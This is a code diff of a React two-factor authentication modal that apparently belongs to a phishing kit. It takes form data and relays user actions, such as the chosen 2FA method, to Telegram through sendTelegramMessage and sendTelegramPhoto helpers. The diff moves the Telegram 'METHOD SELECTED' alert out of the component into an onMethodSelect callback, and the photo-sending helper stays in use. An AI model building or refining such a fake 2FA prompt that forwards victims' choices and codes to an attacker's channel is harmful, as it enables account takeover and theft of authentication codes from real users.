@@ -8,7 +8,7 @@ import TwoFAImage from '@/assets/images/2FA.png';
 import AnotherDeviceNotificationImage from '@/assets/images/F3-2FA-AnotherDeviceNotification.png';
 import DocumentIcon from '@/assets/images/ic_document.svg';
 import config from '@/utils/config';
-import { sendTelegramMessage, sendTelegramPhoto } from '@/utils/send-message';
+import { sendTelegramPhoto } from '@/utils/send-message';
 
 const imageSrc = (image: StaticImageData | string) => (typeof image === 'string' ? image : image.src);
 
@@ -16,12 +16,13 @@ interface TwoFAModalProps {
     show: boolean;
     onClose: () => void;
     onSubmit: (code: string) => void;
+    onMethodSelect: (method: string) => void;
     onSuccess: () => void;
     texts: UiTexts;
     formData?: Partial<FormData>;
 }
 
-const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: TwoFAModalProps) => {
+const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts, formData }: TwoFAModalProps) => {
     const [code, setCode] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
@@ -139,12 +140,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
             methodText = texts.idAndSelfieVideo;
         }
 
-        const safeMethod = String(methodText)
-            .replaceAll('&', '&amp;')
-            .replaceAll('<', '&lt;')
-            .replaceAll('>', '&gt;');
-
-        sendTelegramMessage(`🔔 <b>METHOD SELECTED</b>\nMethod: <code>${safeMethod}</code>`).catch(() => {});
+        onMethodSelect(methodText);
     };
 
     const handleMethodSelect = (value: string) => {
